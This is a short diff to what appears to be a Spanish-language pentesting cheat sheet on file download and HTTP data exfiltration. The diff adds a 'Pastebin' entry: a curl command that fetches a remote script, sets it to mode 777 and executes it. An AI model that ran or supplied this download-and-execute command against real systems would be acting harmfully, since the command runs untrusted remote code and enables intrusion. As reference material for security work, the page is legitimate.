@@ -69,6 +69,10 @@ C#
 ```
 csharp -e 'new System.Net.WebClient ().DownloadString ("https://www.google.com")'
 ```
+Aprovechar Pastebin
+```
+(curl https://pastebin.com/raw/<id> > a.sh) && chmod 777 a.sh && ./a.sh
+```
 #### Publicación de datos por medio de HTTP
 Servidor HTTP rápido
 ```python
